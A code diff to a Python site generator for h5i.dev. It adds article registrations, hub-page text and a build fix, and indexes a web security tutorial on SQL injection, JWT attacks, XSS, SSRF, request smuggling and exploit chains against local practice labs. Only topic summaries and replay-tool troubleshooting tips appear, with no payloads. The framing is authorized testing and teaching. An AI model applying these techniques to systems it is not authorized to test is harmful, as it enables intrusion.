+</code></pre>
+<p>Status, size, time. The outlier is the finding.</p>
+<hr />
+<h2 id="when-something-does-not-work">When something does not work</h2>
+<pre><code>payload had no effect      →  websec show req_N --raw   (did it leave as written?)
+everything returns the same →  h5i browser requests     (did policy refuse it?)
+a loop goes quiet          →  --reset-budget
+--set refused              →  --create
+a value became a string    →  it did not parse as JSON — check the quoting
+% got re-encoded           →  --raw-target
+framing headers rewritten  →  --raw-request
+a page script did nothing  →  --script on the session
+a socket said nothing      →  raise --wait-ms
+</code></pre>""",
+}
+
+
+
+
+ARTICLES = [RECON, ACCESS, JWT, SQLI, INJECTION_LABS, BROWSERXSS, SSRF, PROTOCOL,
+            LOGIC, CHAINS, CHEATSHEET,
+            SESSION, WEB_SECURITY_GUIDE, FIRST_BOX, POLICY, BROWSER, REVIEW_PR,
+            AI_PENTESTING_TOOLS, BURP_COMPARISON, ZAP_COMPARISON, CAIDO_COMPARISON,
+            LOOP, ENVIRONMENT, TIERS, EVIDENCE, INJECTION]
 
 
 def index_page(section, items):
@@ -1163,10 +3765,14 @@ def index_page(section, items):
     # Both hubs lead with the browser, because that is what h5i is; the box is
     # where a session is placed, not the headline.
     title = "h5i guides: agent browsing and web security testing" if guides else "h5i essays: agent browsers, sandboxes, and web security"
-    description = ("Six h5i guides for auditable agent browsing, sandboxed code review, and authorized AI web security testing for pentests, red teams, and CTFs."
+    description = ("A ten-part h5i web security tutorial with runnable CTF labs, plus guides to auditable agent browsing, authorized AI pentesting, and sandboxed code review."
                    if guides else "Nine essays on auditable AI browsing, sandboxing, evidence, and comparisons of h5i with Burp Suite, OWASP ZAP, and Caido for agent testing.")
-    h1 = "One path from a browser session to a reviewed patch" if guides else "Fewer posts. Sharper arguments."
-    deck = ("Start at the top and follow the sequence. Each guide has one outcome, commands you can run, a verification step, and the point where human judgment belongs." if guides else "The blog is not a changelog and not a keyword warehouse. These essays explain the design decisions that stay true when commands and releases change.")
+    # A hub heading names the section. It is the one page on the site whose
+    # job is to be a label, so the argument goes in the deck.
+    h1 = "h5i Guides" if guides else "h5i Blog"
+    deck = ("The web security tutorial runs first, ten articles against 42 deliberately vulnerable labs you run on your own machine, from recon to a full exploit chain. Then the task guides: drive a browser session and audit the requests behind it, scope an agent to a target you are authorized to test, and run untrusted code in a box."
+            if guides else
+            "Why an agent's browser and its boundary belong in one place, what counts as evidence of what an agent actually did, and where h5i differs from Burp Suite, OWASP ZAP, and Caido.")
     url = f"https://h5i.dev/{section}/"
     # A hub is a page in its own right. Without CollectionPage and a breadcrumb
     # it is the one level of the site with no trail, while every article under
@@ -1185,12 +3791,12 @@ def index_page(section, items):
     ]}
     rows = ""
     for i, item in enumerate(items, 1):
-        label = f"Step {i:02d}" if guides else f"Essay {i:02d}"
+        label = item["eyebrow"].split(" / ")[0]
         rows += f"""<a class="post-card{' featured' if i == 1 else ''}" href="/{section}/{item['slug']}/">
 <div class="card-meta"><span>{label}</span><span>{item['time']}</span></div>
 <h2>{item['h1']}</h2><p>{item['description']}</p></a>"""
     return f"""{head(title, description, url, schema, kind="website", rss=not guides)}
-<body>{NAV}<section class="index-hero"><div class="post-eyebrow">{"Field guides" if guides else "Design essays"}</div>
+<body>{NAV}<section class="index-hero"><div class="post-eyebrow">{len(items)} {"chapters and guides" if guides else "essays and comparisons"}</div>
 <h1>{h1}</h1><p>{deck}</p></section><section class="post-list">{rows}</section>{FOOTER}</body></html>"""
 
 
@@ -1246,7 +3852,10 @@ def build():
     generated = {}
     for section in ("blog", "guides"):
         base = ROOT / section
-        for child in base.iterdir():
+        # list(), not the generator: removing entries while iterating the
+        # directory skips some of them, and a survivor makes the mkdir below
+        # fail on a slug this build owns.
+        for child in list(base.iterdir()):
             if child.is_dir():
                 shutil.rmtree(child)
         selected = [item for item in ARTICLES if item["section"] == section]
@@ -1302,14 +3911,21 @@ def build():
 - [AI pentesting tools compared](https://h5i.dev/blog/ai-pentesting-tools/): Burp Suite, OWASP ZAP, Caido, and h5i, chosen by what you delegate to AI.
 - [Manual](https://h5i.dev/manual/): Authoritative command, policy, receipt, and limitation reference.
 
-## Guides
+## The web security tutorial
 
-1. [Run an authorized web security test with an AI agent](https://h5i.dev/guides/authorized-web-security-testing/): Scope, capture, enumerate, replay, and report a pentest, CTF, or red-team exercise.
-2. [Open a session and read what it reached](https://h5i.dev/guides/drive-a-browser-session/): Drive a page by @ref handle, then audit the fail-closed request log.
-3. [Take one coding task from prompt to reviewed patch](https://h5i.dev/guides/first-box/): Create, work, inspect, export, and remove a local box.
-4. [Run the pull request before you trust the pull request](https://h5i.dev/guides/review-a-pull-request/): Execute external code in a detached box and review evidence before prose.
-5. [Write down what the agent may reach](https://h5i.dev/guides/write-a-box-policy/): Define filesystem, network, isolation, and resource policy in .h5i/env.toml.
-6. [Watch the page, then take the controls](https://h5i.dev/guides/watch-the-browser/): Run the browser beside the dev server and transfer control without stale handles.
+Ten articles that walk the 42 runnable labs in h5i-dev/h5i-tutorial, from recon to a complete exploit chain. Part 1 of the series is on Medium; these are the rest.
+
+1. [Recon and IDOR](https://h5i.dev/guides/recon-and-idor/): Discover hidden endpoints, then test object-level authorization and why an unguessable URL is not an access control.
+2. [Broken Access Control](https://h5i.dev/guides/broken-access-control/): Compare two logged-in users with --as, and find the fields a user interface never sends.
+3. [JWT Attacks](https://h5i.dev/guides/jwt-attacks/): alg confusion, a weak HMAC secret, and a key identifier turned into a path traversal.
+4. [SQL Injection](https://h5i.dev/guides/sql-injection/): A union read, then boolean and timing oracles when the application reveals almost nothing.
+5. [Injection Beyond SQL](https://h5i.dev/guides/injection-beyond-sql/): NoSQL operators, shell commands, server-side templates, XML entities, and second-order input.
+6. [The Browser as a Weapon](https://h5i.dev/guides/browser-as-a-weapon/): Reflected and stored XSS, CSRF, CORS misconfiguration, and an OAuth redirect_uri leak.
+7. [SSRF and File Attacks](https://h5i.dev/guides/ssrf-and-file-attacks/): Internal services, filter bypasses, encoded traversal, upload writes, and log poisoning.
+8. [HTTP Protocol Attacks](https://h5i.dev/guides/http-protocol-attacks/): Request smuggling, CRLF injection, host header poisoning, cache poisoning, WebSocket frames.
+9. [Business Logic, Time, and Crypto](https://h5i.dev/guides/logic-time-and-crypto/): Races, coupon stacking, predictable tokens, length extension, MFA state, and a pickled cookie.
+10. [Building Exploit Chains](https://h5i.dev/guides/exploit-chains/): Carry fresh values between requests and turn small findings into one reproducible compromise.
+11. [Cheatsheet](https://h5i.dev/guides/cheatsheet/): The loop, every --set target, the replay flags, probe values by class, and how to read a sweep.
 
 ## Tool comparisons
 
